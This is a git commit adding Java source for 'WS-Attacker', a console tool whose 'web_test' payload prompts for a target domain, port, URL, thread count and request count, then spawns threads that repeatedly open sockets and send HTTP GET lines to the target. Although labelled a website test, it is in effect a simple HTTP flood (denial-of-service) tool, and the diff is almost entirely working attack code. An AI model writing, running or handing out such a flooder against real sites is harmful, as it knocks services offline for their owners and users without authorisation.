3b819ebfe98023f5a56722523db4f7d600b816fd
LinWin-Cloud <2382546858@qq.com>
2022-12-04 12:07:12 +0800

    网站测试攻击模块

--- com.WsAttacker.package/src/webSiteTest.java
+++ com.WsAttacker.package/src/webSiteTest.java
@@ -1,2 +1,66 @@
-package PACKAGE_NAME;public class webSiteTest {
+
+
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.io.PrintWriter;
+import java.net.Socket;
+import java.util.Scanner;
+
+public class webSiteTest {
+
+    public static int sendNum = 1;
+
+    public static void webTest() {
+        try {
+            //get the number of the attacker.
+            Scanner scanner = new Scanner(System.in);
+            System.out.print("WS-Attacker / Web_Test_> Enter Thread Number: ");
+            int testAttackerNum = Integer.valueOf(scanner.nextLine());
+            //get the num,ber of the send requests
+            Scanner scanner1 = new Scanner(System.in);
+            System.out.print("WS-Attacker / Web_Test_> Enter Send Requests Number: ");
+            int testSendNum = Integer.valueOf(scanner1.nextLine());
+            Scanner scanner2 = new Scanner(System.in);
+            System.out.print("WS-Attacker / Web_Test_> Enter Test Domain: ");
+            String domain = scanner2.nextLine();
+            Scanner scanner3 = new Scanner(System.in);
+            System.out.print("WS-Attacker / Web_Test_> Enter Test Domain's Port: ");
+            int port = Integer.valueOf(scanner2.nextLine());
+            System.out.print("WS-Attacker / Web_Test_> Enter Test URL: ");
+            Scanner scanner4 = new Scanner(System.in);
+            String url = scanner4.nextLine();
+
+            for (int i=0;i < testAttackerNum ;i++) {
+                Thread thread = new Thread(new Runnable() {
+                    @Override
+                    public void run() {
+                        for (int i=0;i < testSendNum/testAttackerNum;i++) {
+                            sendNum++;
+                            webSiteTest.Attack(testSendNum,domain,port,url);
+                            System.out.println("[!] Test: "+domain+" "+ i);
+                        }
+                    }
+                });
+                thread.start();
+            }
+
+        }catch (Exception exception) {
+            System.out.println("[!] Must enter a int number!");
+        }
+    }
+    public static void Attack(int sendNum,String domain,int port,String url) {
+        try {
+            Socket socket = new Socket(domain,port);
+            OutputStream outputStream = socket.getOutputStream();
+            InputStream inputStream = socket.getInputStream();
+            PrintWriter printWriter = new PrintWriter(outputStream);
+            printWriter.println("GET "+url+" HTTP/1.1");
+            printWriter.flush();
+            socket.close();
+
+        }catch (Exception exception) {
+            System.out.println(exception.getLocalizedMessage());
+            System.exit(0);
+        }
+    }
 }
--- com.WsAttacker.package/src/wsAttacker.java
+++ com.WsAttacker.package/src/wsAttacker.java
@@ -1,2 +1,84 @@
+
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.FileReader;
+import java.nio.file.WatchService;
+import java.util.Scanner;
+
 public class wsAttacker {
+
+    public static String configRoot = "../config/";
+
+    public static void main(String[] args) {
+        try {
+            File file = new File(wsAttacker.configRoot+"logo.txt");
+            FileReader fileReader = new FileReader(file);
+
+            //read the logo boo file.
+            //ws-attacker.
+            BufferedReader bufferedReader = new BufferedReader(fileReader);
+            String line;
+            while ((line=bufferedReader.readLine())!=null) {
+                System.out.println(line);
+            }
+            bufferedReader.close();
+            fileReader.close();
+            String Version = "";
+            try {
+                //read the version information.
+                File file1 = new File(wsAttacker.configRoot+"Version.txt");
+                FileReader fileReader1 = new FileReader(file1);
+                BufferedReader bufferedReader1 = new BufferedReader(fileReader1);
+                System.out.println("Version: "+bufferedReader1.readLine());
+                System.out.println("Enter: 'show options' to get the options and help.");
+                System.out.println("Enter: 'exit' to exit the console.");
+                bufferedReader1.close();
+                fileReader1.close();
+
+                //then into the command UI.
+                wsAttacker.commandOprint();
+            }catch (Exception exception) {
+                //do not find the config file.
+                System.out.println("[Error] Do not find config file: Version.txt");
+                System.exit(0);
+            }
+
+        }catch(Exception exception) {
+            System.out.println("[Error] Do not find config file: logo.txt");
+        }
+    }
+    public static void commandOprint() {
+        System.out.println("");
+        Scanner scanner = new Scanner(System.in);
+
+        while (true) {
+            System.out.print("WS-Attacker_> ");
+            String getCommand = scanner.nextLine();
+            if (getCommand.equals("exit")) {
+                System.exit(0); //exit the console.
+            }
+            if (getCommand.equals("show options")) {
+                wsAttacker.fileRead(wsAttacker.configRoot+"options.txt");
+            }
+            if (getCommand.equals("use payload web_test")) {
+                webSiteTest.webTest();
+            }
+        }
+    }
+    public static void fileRead(String name) {
+        //to read this file's content.
+        try {
+            File file = new File(name);
+            FileReader fileReader = new FileReader(file);
+            BufferedReader bufferedReader = new BufferedReader(fileReader);
+            String line;
+            while ((line=bufferedReader.readLine())!=null) {
+                System.out.println(line);
+            }
+            bufferedReader.close();
+            fileReader.close();
+        }catch (Exception exception) {
+            exception.printStackTrace();
+        }
+    }
 }
